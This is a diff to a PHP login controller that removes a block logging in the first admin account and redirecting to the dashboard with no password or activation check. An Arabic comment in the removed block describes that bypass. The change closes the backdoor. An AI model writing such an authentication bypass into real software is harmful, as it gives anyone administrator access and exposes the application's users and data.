@@ -36,13 +36,6 @@ class LoginController extends BaseController
 
     public function login(Request $request): RedirectResponse
     {
-        // 🚀 تسجيل دخول إجباري وتوجيه مباشر إلى الـ Dashboard بدون قيود التفعيل أو كلمة المرور
-        $admin = \App\Models\Admin::first();
-        if ($admin) {
-            auth('admin')->login($admin, $request->has('remember'));
-            return redirect('admin/dashboard');
-        }
-
         $admin = $this->admin->where('email', $request['email'])->first();
         if (isset($admin) && in_array($request['role'], [UserRole::ADMIN, UserRole::EMPLOYEE]) && $admin->status) {
             if ($admin['id'] == 1 && $request['role'] != 'admin') {
